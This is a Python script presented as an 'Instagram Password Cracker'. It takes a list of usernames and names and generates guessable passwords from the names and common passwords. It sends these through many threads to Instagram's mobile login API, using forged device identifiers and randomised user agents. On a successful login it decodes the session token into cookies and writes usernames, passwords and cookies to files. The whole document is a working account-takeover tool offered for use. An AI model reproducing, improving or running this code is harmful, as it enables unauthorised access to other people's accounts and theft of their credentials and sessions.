#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Cracker - Enhanced Version
File-based password cracking with smart patterns
Author: BITHIKA
Version: 2.0
"""
import hashlib
import uuid
import time
import urllib.parse
import random
import requests
import re
import json
import base64
import sys
import string
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Color codes
G1 = "\033[1;92m"  # Green
G2 = "\033[1;96m"  # Cyan
A = "\033[1;97m"   # White

# Global variables with proper initialization
loop = 0
oks = []
cps = []

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*56}")

def get_password_patterns(uid, name=None):
    """Generate password patterns based on UID and name"""
    passwords = []
    
    # If name is provided, extract first and last name
    if name and '|' in name:
        name = name.split('|')[1].strip()
    
    if name:
        # Split name into first and last
        name_parts = name.split()
        if len(name_parts) >= 2:
            fs = name_parts[0]  # First name
            ls = name_parts[-1] # Last name
        else:
            fs = name
            ls = name
        
        # Base password patterns
        base_patterns = [
            'first', 'First', 'firstlast', 'FirstLast',
            'lastfirst', 'LastFirst', 'first123', 'First123',
            'name', 'Name', 'name123', 'Name123',
            'firstname', 'FirstName', 'lastname', 'LastName'
        ]
        
        # Generate password variations
        for pattern in base_patterns:
            pw = pattern.replace('first', fs.lower()).replace('First', fs)
            pw = pw.replace('last', ls.lower()).replace('Last', ls)
            pw = pw.replace('name', name.lower()).replace('Name', name)
            passwords.append(pw)
            
            # Add numeric variations
            passwords.extend([
                pw + '123',
                pw + '1234',
                pw + '12345',
                pw + '123456',
                pw + '@123',
                pw + '!@#',
                '123' + pw,
                pw + '2024',
                pw + '2023'
            ])
    
    # Always add UID-based patterns
    passwords.extend([
        uid,
        uid[:6],
        uid[:8],
        '123456',
        '12345678',
        'password',
        'Password',
        'qwerty',
        'admin',
        'welcome',
        'iloveyou',
        'monkey',
        '57273200'
    ])
    
    # Remove duplicates
    return list(set(passwords))[:50]  # Limit to 50 passwords

def crack(uid, password_list, total_count, name=None):
    """Enhanced Instagram account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop
        loop += 1
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]                   ")
            sys.stdout.flush()
            
            # Create session and generate device hash
            session = requests.Session()
            # Generate device ID and other required IDs
            device_id = f"android-{uuid.uuid4().hex[:16]}"
            family_device_id = str(uuid.uuid4())
        
            # First hash for username+password
            first_hash = hashlib.md5()
            first_hash.update(uid.encode('utf-8') + pw.encode('utf-8'))
            first_hex = first_hash.hexdigest()
        
            # Second hash with salt for device ID
            second_hash = hashlib.md5()
            second_hash.update(first_hex.encode('utf-8') + '12345'.encode('utf-8'))
            android_id_hash = second_hash.hexdigest()[:16]
        
            # Generate user agent
            useragent = f'Instagram {random.randint(111, 999)}.0.0.{random.randint(1, 99)}.{random.randint(1, 9)} Android ({random.randint(21, 31)}/{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}; {random.randint(280, 1080)}x{random.randint(720, 1920)}; samsung; SM-G973F; samsung; {random.choice(["exynos9820", "sm6150"])}; en_US; {random.randint(100000000, 999999999)})'
            
            headers = {
            'host': 'i.instagram.com',
            'x-ig-app-locale': 'in_ID',
            'x-ig-device-locale': 'in_ID',
            'x-ig-mapped-locale': 'id_ID',
            'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
            'x-pigeon-rawclienttime': f'{time.time():.3f}',
            'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
            'x-ig-www-claim': '0',
            'x-bloks-is-prism-enabled': 'false',
            'x-bloks-is-layout-rtl': 'false',
            'x-ig-device-id': device_id,
            'x-ig-family-device-id': family_device_id,
            'x-ig-android-id': f'android-{android_id_hash}',
            'x-fb-connection-type': 'MOBILE.LTE',
            'x-ig-connection-type': 'MOBILE(LTE)',
            'x-ig-capabilities': '3brTv10=',
            'priority': 'u=3',
            'user-agent': useragent,
            'accept-language': 'id-ID, en-US',
            'x-mid': '',
            'ig-intended-user-id': '0',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-ip': 'True',
            'x-fb-server-cluster': 'True',
            'x-ig-bandwidth-speed-kbps': str(random.randint(100, 300)),
            'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
            'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 9000)),
            'x-ig-app-id': '3419628305025917',
            'connection': 'keep-alive'
            }
            
            # Generate timestamp for password
            timestamp = int(time.time())
        
            # URL encode username and password
            encoded_username = urllib.parse.quote(uid)
            encoded_password = urllib.parse.quote(pw)
        
            # Generate encrypted password format
            encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
            
            # Prepare the encoded data
            params_dict = {
            "client_input_params": {
                "device_id": f"android-{android_id_hash}",
                "login_attempt_count": 1,
                "secure_family_device_id": "",
                "machine_id": "",
                "accounts_list": [],
                "auth_secure_device_id": "",
                "password": encrypted_password,
                "family_device_id": family_device_id,
                "fb_ig_device_id": [],
                "device_emails": [],
                "try_num": 3,
                "event_flow": "login_manual",
                "event_step": "home_page",
                "openid_tokens": {},
                "client_known_key_hash": "",
                "contact_point": encoded_username,
                "encrypted_msisdn": ""
            },
            "server_params": {
                "username_text_input_id": "p5hbnc:46",
                "device_id": f"android-{android_id_hash}",
                "should_trigger_override_login_success_action": 0,
                "server_login_source": "login",
                "waterfall_id": str(uuid.uuid4()),
                "login_source": "Login",
                "INTERNAL__latency_qpl_instance_id": 152086072800150,
                "reg_flow_source": "login_home_native_integration_point",
                "is_platform_login": 0,
                "is_caa_perf_enabled": 0,
                "credential_type": "password",
                "family_device_id": family_device_id,
                "INTERNAL__latency_qpl_marker_id": 36707139,
                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                "INTERNAL_INFRA_THEME": "harm_f",
                "password_text_input_id": "p5hbnc:47",
                "ar_event_source": "login_home_page"
            }
        }
        
            # Convert params to JSON string and URL encode
            params_json = json.dumps(params_dict)
            encoded_params = urllib.parse.quote(params_json)
        
            # Prepare the complete encoded string
            encode = f'params={encoded_params}&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
        
            # Update content-length in headers
            headers['content-length'] = str(len(encode))
            
            # login url 
            url = 'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/'
            
            # Make API request
            response = session.post(
                url, 
                data=encode, 
                headers=headers, 
                allow_redirects=True,
                timeout=30
            )
            
            # Check response
            if 'logged_in_user' in response.text:
                print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
                if match := re.search(r'"IG-Set-Authorization":\s*"(.*?)"', response.text.replace('\\', '')):
                   decoded = json.loads(base64.urlsafe_b64decode(match.group(1).split('Bearer IGT:2:')[1].ljust(4, '=')))
                   cookies = ';'.join(f'{k}={v}' for k,v in decoded.items())
                   print(cookies)
                   with open("/sdcard/SUCCESS_ACCOUNTS.txt","a") as f:
                       f.write(uid+"|"+pw+"|"+cookies+"\n")
                   with success_lock:
                       oks.append(uid)
                   return True       
            elif 'challenge_required' in response.text:
                with open("/sdcard/CHALLENGE_ACCOUNTS.txt","a") as f:
                    f.write(uid+"|"+pw+"\n")
                with success_lock:
                    cps.append(uid)
                continue
            elif 'checkpoint_required' in response.text:
                with open("/sdcard/CHECKPOINT_ACCOUNTS.txt","a") as f:
                    f.write(uid+"|"+pw+"\n")
                with success_lock:
                    cps.append(uid)
                continue
            else:
                continue
                
    except requests.exceptions.Timeout:
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException:
        return False
    except KeyboardInterrupt:
        print(f"\r\033[1;93m [Interrupted] User stopped the process")
        raise
    except Exception:
        return False
    
    return False

def file_crack():
    """File-based cracking function"""
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/users.txt')
    linex()
    print(f'{G1}[{A}ℹ{G2}]{G2} File Format: username|name (one per line)')
    print(f'{G1}[{A}ℹ{G2}]{G2} Example: john_doe|John Doe')
    linex()
    
    # Voice prompt
    try:
        os.system('espeak -a 150 "ENTER YOUR FILE NAME"')
    except:
        pass
    
    file_name = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
    
    try:
        # Read the file
        with open(file_name, 'r', encoding='utf-8', errors='ignore') as f:
            user_list = f.read().splitlines()
        
        if not user_list:
            print(f'{G1}[{A}={G2}]{G2} FILE IS EMPTY...')
            time.sleep(2)
            return
        
        print(f'\n{G1}[{A}+{G1}]{G1} LOADED {len(user_list)} USERS')
        
        # Ask for threads
        try:
            threads = int(input(f'{G1}[{A}?{G2}]{G2} Number of threads (1-100) {A}:{G2} '))
            if threads < 1 or threads > 100:
                threads = 20
        except:
            threads = 20
        
        # Reset counters
        global loop, oks, cps
        with counter_lock:
            loop = 0
        with success_lock:
            oks.clear()
        cps.clear()
        
        start_time = time.time()
        
        # Process users
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            for user_entry in user_list:
                # Parse user entry (format: username|name)
                if '|' in user_entry:
                    uid, name = user_entry.split('|', 1)
                    uid = uid.strip()
                    name = name.strip()
                else:
                    uid = user_entry.strip()
                    name = None
                
                # Generate passwords for this user
                password_patterns = get_password_patterns(uid, name)
                
                # Submit task
                future = executor.submit(crack, uid, password_patterns, len(user_list), name)
                futures.append(future)
            
            # Wait for completion
            for future in as_completed(futures):
                try:
                    future.result()
                except KeyboardInterrupt:
                    print(f"\n{G1}[{A}!{G2}]{G2} Interrupted by user!")
                    executor.shutdown(wait=False)
                    break
                except Exception as e:
                    print(f"\n{G1}[{A}!{G2}]{G2} Error: {e}")
        
        # Display results
        end_time = time.time()
        execution_time = end_time - start_time
        
        clear()
        print(f"\n{G1}[{A}={G1}]{G1} FILE CRACKING COMPLETED!")
        linex()
        print(f"{G1}[{A}✓{G2}]{G2} Total Users: {len(user_list)}")
        print(f"{G1}[{A}✓{G2}]{G2} Success: {len(oks)}")
        print(f"{G1}[{A}✗{G2}]{G2} Failed: {len(cps)}")
        print(f"{G1}[{A}⏱️{G2}]{G2} Time: {execution_time:.2f}s")
        print(f"{G1}[{A}🚀{G2}]{G2} Speed: {len(user_list)/execution_time:.2f} users/s")
        linex()
        
        if len(oks) > 0:
            print(f"{G1}[{A}🎉{G2}]{G2} SUCCESSFUL ACCOUNTS SAVED TO: /sdcard/SUCCESS_ACCOUNTS.txt")
            print(f"{G1}[{A}+{G2}]{G2} First 5 successes:")
            for i, uid in enumerate(oks[:5]):
                print(f"  {G1}[{A}{i+1}{G2}]{G2} {uid}")
        
        if len(cps) > 0:
            print(f"\n{G1}[{A}⚠{G2}]{G2} Challenge/Checkpoint accounts saved to separate files")
        
        input(f"\n{G1}[{A}!{G2}]{G2} PRESS ENTER TO RETURN TO MENU...")
        
    except FileNotFoundError:
        print(f'{G1}[{A}={G2}]{G2} FILE NOT FOUND ...')
        time.sleep(2)
        retry = input(f'{G1}[{A}?{G2}]{G2} Try again? (y/n) {A}:{G2} ')
        if retry.lower() == 'y':
            file_crack()
    except Exception as e:
        print(f'{G1}[{A}={G2}]{G2} ERROR: {str(e)}')
        time.sleep(2)

def show_statistics():
    """Show program statistics"""
    clear()
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
    print(f"\033[1;96m{'='*56}")
    print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
    print(f" \033[1;97m[💾] Files saved to /sdcard/")
    print(f"  └─ \033[1;92mSUCCESS_ACCOUNTS.txt")
    print(f"  └─ \033[1;93mCHALLENGE_ACCOUNTS.txt")
    print(f"  └─ \033[1;91mCHECKPOINT_ACCOUNTS.txt")
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*56}")
        print(f"\033[1;96m     🚀 INSTAGRAM PASSWORD CRACKER 🚀")
        print(f"\033[1;96m{'='*56}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 📁 File-Based Cracking")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*60}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            file_crack()
        elif choice == '2':
            show_statistics()
        elif choice == '3':
            clear()
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;93m[!] Results saved in /sdcard/")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
            time.sleep(2)

# ASCII logo
logo = f"""
{G1}╔══════════════════════════════════════════════════════╗
{G1}║    ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗    ║
{G1}║    ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝    ║
{G1}║    ██║██╔██╗ ██║███████╗   ██║   ███████║██║         ║
{G1}║    ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║         ║
{G1}║    ██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╗    ║
{G1}║    ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ║
{G1}║    {A}Instagram Password Cracker v2.0               {G1}║
{G1}║    {A}Author: BITHIKA - All rights reserved           {G1}║
{G1}╚══════════════════════════════════════════════════════╝
"""

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Display logo
        clear()
        print(logo)
        time.sleep(2)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
